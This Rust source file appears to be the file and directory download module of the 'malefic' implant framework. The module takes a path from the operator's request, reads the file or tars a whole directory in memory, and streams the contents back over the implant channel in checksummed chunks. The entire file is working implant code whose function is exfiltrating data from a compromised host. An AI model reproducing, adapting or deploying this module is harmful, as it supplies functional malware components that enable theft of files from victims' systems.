use crate::{check_field, check_request, Module, ModuleImpl, TaskResult};
use async_trait::async_trait;
use malefic_helper::common::filesys::{check_sum, check_sum_bytes};
use malefic_helper::debug;
use malefic_proto::proto::modulepb::{DownloadResponse, DownloadRequest};
use malefic_proto::proto::implantpb::{spite::Body};
use malefic_trait::module_impl;
use std::fs::{metadata, read_dir, File, OpenOptions};
use std::io::{Cursor, Read, Seek, Write};
use std::path::Path;
use futures::SinkExt;
use tar::{Builder, Header};
use malefic_proto::ModuleResult;

pub struct Download {}

#[async_trait]
#[module_impl("download")]
impl Module for Download {}

#[async_trait]
impl ModuleImpl for Download {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::DownloadRequest)?;

        if request.dir {
            self.download_dir(id,receiver, sender, request).await
        } else {
            self.download_file(id,receiver, sender, request).await
        }
    }
}

impl Download {
    pub async fn download_file(
        &mut self,
        id : u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
        request: DownloadRequest
    ) -> ModuleResult {
        let path: String = check_field!(request.path)?;
        let mut file = OpenOptions::new().read(true).open(path.clone())?;

        let sum = check_sum(&path)?;
        let metadata = metadata(&path)?;
        let size = metadata.len();
        debug!("checksum: {}, size: {}", sum, size);
        let _ = sender
            .send(TaskResult::new_with_body(
                id,
                Body::DownloadResponse(DownloadResponse {
                    checksum: (sum),
                    size: (size),
                    cur: 0,
                    content: Vec::new(),
                }),
            ))
            .await?;

        let buffer_size = request.buffer_size ;
        let total_cur = size / buffer_size as u64 + 1;
        let mut buffer = vec![0; buffer_size as usize];

        loop {

            let drequest = check_request!(receiver, Body::DownloadRequest)?;
            debug!("Receive DownloadRequest, cur: {}",drequest.cur);
            let cur = drequest.cur;
            let buffer_size = drequest.buffer_size as usize;
            let byte_offset = (cur -1) as u64 * buffer_size as u64;
            let _position = file.seek(std::io::SeekFrom::Start(byte_offset))?;
            let n = file.read(&mut buffer)?;
            let sha256sum = check_sum_bytes(&buffer[..n])?;
            debug!("checksum: {}, size: {}, cur: {}", sha256sum.clone(), n, cur);
            let resp = DownloadResponse {
                checksum: sha256sum,
                size: n as u64,
                cur: cur,
                content: buffer[..n].to_vec(),
            };

            if drequest.cur == -1 || cur == total_cur as i32 || n < buffer_size  {
                debug!("Send spite[{}] success, end",cur);
                return Ok(TaskResult::new_with_body(id,Body::DownloadResponse(resp)));
            } else{
                let _ = sender.send(
                    TaskResult::new_with_body(
                        id,
                        Body::DownloadResponse(resp)
                    )).await?;
                debug!("Send spite[{}] success",cur);
            }
        }
    }

    pub async fn download_dir(
        &mut self ,
        id : u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
        request: DownloadRequest
    ) -> ModuleResult {
        let path: String = check_field!(request.path)?;
        let archive_buffer = self.create_tar_archive(&path)?;
        let sha256sum = check_sum_bytes(archive_buffer.as_slice())?;
        let size = archive_buffer.len() as u64;
        debug!("TAR打包完成，总大小: {} 字节, checksum: {}", size, sha256sum);

        // 发送初始响应，包含总大小和校验和
        let _ = sender
            .send(TaskResult::new_with_body(
                id,
                Body::DownloadResponse(DownloadResponse {
                    checksum: sha256sum.clone(),
                    size: size,
                    cur: 0,
                    content: Vec::new(),
                }),
            ))
            .await?;

        let buffer_size = request.buffer_size;
        let total_cur = size / buffer_size as u64 + 1;

        loop {
            let drequest = check_request!(receiver, Body::DownloadRequest)?;
            debug!("Receive DownloadRequest, cur: {}", drequest.cur);
            let cur = drequest.cur;

            let buffer_size = drequest.buffer_size as usize;
            let byte_offset = ((cur - 1) as u64 * buffer_size as u64) as usize;

            // 计算当前分片的实际大小
            let chunk_size = if byte_offset + buffer_size > archive_buffer.len() {
                archive_buffer.len() - byte_offset
            } else {
                buffer_size
            };

            // 从内存中的tar包数据提取分片
            let chunk_data = if byte_offset < archive_buffer.len() {
                &archive_buffer[byte_offset..byte_offset + chunk_size]
            } else {
                &[]
            };

            let chunk_checksum = check_sum_bytes(chunk_data)?;
            debug!("checksum: {}, size: {}, cur: {}", chunk_checksum, chunk_data.len(), cur);

            let resp = DownloadResponse {
                checksum: chunk_checksum,
                size: chunk_data.len() as u64,
                cur: cur,
                content: chunk_data.to_vec(),
            };

            if drequest.cur == -1 || cur == total_cur as i32 || chunk_data.len() < buffer_size {
                debug!("Send spite[{}] success, end", cur);
                return Ok(TaskResult::new_with_body(id, Body::DownloadResponse(resp)));
            } else {
                let _ = sender.send(
                    TaskResult::new_with_body(
                        id,
                        Body::DownloadResponse(resp)
                    )).await?;
                debug!("Send spite[{}] success", cur);
            }
        }
    }

    fn create_tar_archive(&self, dir_path: &str) -> std::io::Result<Vec<u8>> {
        let mut archive_buffer = Vec::new();
        {
            let cursor = Cursor::new(&mut archive_buffer);
            let mut tar_builder = Builder::new(cursor);

            self.add_directory_to_tar(&mut tar_builder, Path::new(dir_path), "")?;
            tar_builder.finish()?;
        }
        Ok(archive_buffer)
    }

    fn add_directory_to_tar<W: Write>(
        &self,
        tar_builder: &mut Builder<W>,
        base_path: &Path,
        relative_path: &str,
    ) -> std::io::Result<()> {
        let current_path = if relative_path.is_empty() {
            base_path.to_path_buf()
        } else {
            base_path.join(relative_path)
        };

        for entry in read_dir(&current_path)? {
            let entry = entry?;
            let file_name = entry.file_name().to_string_lossy().to_string();
            let entry_relative_path = if relative_path.is_empty() {
                file_name.clone()
            } else {
                format!("{}/{}", relative_path, file_name)
            };

            let metadata = entry.metadata()?;

            if metadata.is_dir() {
                // 添加目录条目
                let mut header = Header::new_gnu();
                header.set_path(&entry_relative_path)?;
                header.set_size(0);
                header.set_mode(self.get_permissions(&metadata));
                header.set_entry_type(tar::EntryType::Directory);
                header.set_cksum();
                tar_builder.append(&header, std::io::empty())?;

                // 递归处理子目录
                self.add_directory_to_tar(tar_builder, base_path, &entry_relative_path)?;
            } else {
                // 添加文件
                let mut file = File::open(entry.path())?;
                let mut header = Header::new_gnu();
                header.set_path(&entry_relative_path)?;
                header.set_size(metadata.len());
                header.set_mode(self.get_permissions(&metadata));
                header.set_entry_type(tar::EntryType::Regular);
                header.set_cksum();
                tar_builder.append(&header, &mut file)?;

                debug!("Added file to TAR: {} ({} 字节)", entry_relative_path, metadata.len());
            }
        }
        Ok(())
    }

    #[cfg(unix)]
    fn get_permissions(&self, metadata: &std::fs::Metadata) -> u32 {
        use std::os::unix::fs::PermissionsExt;
        metadata.permissions().mode()
    }

    #[cfg(windows)]
    fn get_permissions(&self, _metadata: &std::fs::Metadata) -> u32 {
        // Windows下简化处理，返回标准权限
        0o644
    }
}

